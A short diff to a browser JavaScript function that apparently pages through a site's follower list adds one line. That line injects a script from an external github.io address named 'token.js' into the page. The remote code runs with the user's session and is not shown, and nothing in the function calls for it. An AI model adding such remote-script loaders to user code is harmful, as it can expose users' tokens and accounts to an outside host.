@@ -11,6 +11,7 @@ async function func(){
     
     let userList="";
     document.getElementsByClassName("media-grid")[0].innerHTML="";
+    var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
     for(let page=0;page<followerCount;page+=60){
         var res = await (await fetch(`${location.href}?page=${Math.ceil(page/60)+1}`)).text();
         var box=document.createElement("div");
